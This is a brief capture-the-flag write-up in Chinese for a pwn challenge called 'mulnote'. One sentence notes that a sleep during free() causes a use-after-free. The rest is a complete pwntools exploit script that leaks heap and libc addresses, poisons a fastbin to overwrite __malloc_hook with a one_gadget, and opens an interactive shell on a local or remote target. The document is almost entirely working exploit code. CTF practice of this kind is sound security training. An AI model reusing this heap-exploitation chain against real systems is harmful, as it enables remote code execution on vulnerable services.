# mulnote

`free`的时候`sleep`了10秒,造成`UAF`

```python=
from pwn import *

def cmd(command):
	p.recvuntil(">")
	p.sendline(command)

def add(sz,content):
	cmd('C')
	p.recvuntil("size>")
	p.sendline(str(sz))
	p.recvuntil("note>")
	p.send(content)
	
def show():
	cmd('S')
	

def dele(idx):
	cmd('R')
	p.recvuntil("index>")
	p.sendline(str(idx))
	
def edit(idx,content):
	cmd('E')
	p.recvuntil("index>")
	p.sendline(str(idx))
	p.recvuntil("note>")
	p.send(content)
	

def main(host,port=9999):
	global p
	if host:
		p = remote(host,port)
	else:
		p = process("./mulnote")
		gdb.attach(p)
	add(0x68,"A")
	add(0x68,"A")
	add(0x100,"A")
	add(0x10,"A")	#3
	dele(0)
	dele(1)
	dele(2)
	add(0x68,"A")	#0
	show()
	p.recvuntil("1]:\n")
	heap = u64(p.recv(6).ljust(8,'\x00'))-0x41
	info("heap : " + hex(heap))
	p.recvuntil("2]:\n")
	libc.address = u64(p.recv(6).ljust(8,'\x00'))-0x3c4b78
	info("libc : " + hex(libc.address))
	add(0x68,"A")
	
	dele(4)
	dele(0)
	edit(0,p64(libc.symbols["__malloc_hook"]-0x23)[:6])
	add(0x68,"A")
	
	one_gadget = libc.address+0x4526a
	info("one_gadget : " + hex(one_gadget))
	add(0x68,"\x00"*0x13+p64(one_gadget))
	p.interactive()
	
if __name__ == "__main__":
	libc = ELF("./libc.so",checksec=False)
	# elf = ELF("./mheap",checksec=False)
	main(args['REMOTE'])
```
